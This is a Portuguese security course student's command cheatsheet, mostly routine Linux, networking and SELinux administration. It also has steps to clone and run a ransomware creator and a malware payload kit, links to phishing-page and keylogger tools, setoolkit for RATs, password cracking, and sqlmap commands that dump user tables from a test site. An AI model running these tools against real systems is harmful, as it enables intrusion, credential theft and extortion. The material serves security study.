# Hackers do Bem Cheatsheets and Write-ups

Some stuffs learned on Hackers do Bem Course Fundamentals.

```bash
# Compare files line by line
diff file.one file.two

# Compare files byte by byte
cmp file.one file.two

# Compute MD5 hash
md5sum file.extr

# decrypt caesar ciphers
sudo apt install bsdgames
echo "Uryyb" | rot13

# Todo list on terminal
sudo apt  install taskwarrior
mkdir -p ~/.task
echo 'data.location=~/.task' > ~/.taskrc
task add Some task
task list
task 2 modify +urgent
task 2 done

# ShellPhish: Tool for provide fake pages
# https://github.com/AbirHasan2005/ShellPhish

# Get information about domains
whois my.domain.tld

# Maltego: Tool for OSINT
# https://www.maltego.com

# AdversarialJS: Sample of bypass Neural Networks
# https://kennysong.github.io/adversarial.js/

# Toolkit for generate RAT
setoolkit

# Create a webserver on current folder
python -m http.server 80

# Ransomware Creator tool
git clone https://github.com/Err0r-ICA/Ransomware
python3 Ransomware

# Several Malware Payloads
git clone https://github.com/screetsec/Brutal
./Brutal.sh

# Sample of keylogger for windows
# https://github.com/MinhasKamal/StupidKeylogger

# Tool for encryption
# https://ccrypt.sourceforge.net
ccrypt -e message.txt
ccrypt -d message.txt.cpt

# Tool for send logs via email
nano /etc/logcheck/logcheck.conf
sudo -u logcheck logcheck -o -t

# Using tor browser
torbrowser-launcher

# Navigating on DeepWeb
# https://thehiddenwiki.org

# Configuring Local Policies on Windows
secpol

# Searching sploits on exploit-db.com
searchsploit -u
searchsploit openssl
searchsploit -t windows 10

# Nmap ping scan
nmap -sn 192.168.98.0/24

# Nmap ack scan to bypass firewalls
nmap -sA 192.168.98.0/24

# Nmap show open ports
nmap --open 192.168.98.0/24

# Show net packets on nmap
nmap --packet-trace 192.168.98.0/24

# Tool for web hacking
burpsuite

# Listen port with netcat
nc -l -p 5555 -v

# Redirect ports with ncat
# term1 ---> 6001 <---> 6000 <--- term2
ncat -vl 6001 -c 'ncat -l 6000'
ncat -nv 127.0.0.1 6001
ncat -nv 127.0.0.1 6000

# Tunneling with ncat
# term1 ---> 6002 <---> 6001 <---> 6000 <--- term2
ncat -vl 6001 -c 'ncat -l 6000'
ncat -vl 6002 -c 'ncat -nv 127.0.0.1 6001'
ncat -nv 127.0.0.1 6002
ncat -nv 127.0.0.1 6000

# List interfaces and show MTU
netstat -i

# Show route table
netstat -rn
route -n

# Network statistics
netstat -s

# Show opened ports and program
netstat -anptu

# Honeypot creator tool
# https://github.com/technicaldada/pentbox

# Resolve dns domain
host -t ns esr.rnp.br

# Resolve dns domain
nslookup
> set type=A
> my.domain.tld

# Resolve dns domain
dig grancursosonline.com.br -t ns
dig grancursosonline.com.br CNAME

# Enable Security-Enhanced Linux
selinux-activate

# Check status of SELinux
sestatus

# List users of SELinux
semanage user -l

# List logins of SELinux
semanage login -l

# List variables of SELinux
semanage boolean -l

# List ports of SELinux
semanage port -l

# Restart machine
shutdown -r now

# KeePassXC password vault
# https://keepassxc.org

# Create new user
useradd -p $(openssl passwd -1 abcd123) teste1

# John the ripper
john -format=crypt credencial.txt

# See client localhost and secret on Freeradius
cat /etc/freeradius/3.0/clients.conf

# Create a user on Freeradius
nano /etc/freeradius/3.0/users
> usuario1 Cleartext-Password := "rnpesr"

# Run Freeradius in debug mode
freeradius -X

# Test conection on Freeradius
radtest usuario1 rnpesr 127.0.0.1 0 testing123

# Set timezone
timedatectl set-timezone America/Sao_Paulo
timedatectl

# Check if TPM is present
journalctl -k --grep=tpm

# List USB
sudo apt install usbview
usbview

# TOTP and HOTP Tool
otpclient

# Force update group policy on Windows
gpupdate /force

# List all users on Linux
getent passwd | cut -d: -f1

# List all groups on Linux
getent group | cut -d: -f1

# Create group on Linux
groupadd contabilidade

# Add user teste1 to a group on Linux
usermod -aG contabilidade teste1

# Change group owner of a file on Linux
chown :contabilidade texto.txt

# Check password status on Linux
passwd -S

# Set password expirations dates
sudo nano /etc/login.defs

# List malwares signatures on ClamAV
sigtool --list-sigs

# Generate shortlinks
curl -s -i https://tinyurl.com/api-create.php?url=https://my.link

# Generate QR Code
sudo apt install qrencode
qrencode -o qr_code.png "https://my.link"

# Check if url is vulnerable to clickjacker
https://clickjacker.io

# Automate SQL Injection - List dbs
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 –dbs

# Automate SQL Injection - List tables
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables

# Automate SQL Injection - List columns
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –columns

# Automate SQL Injection - dump table/column
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
```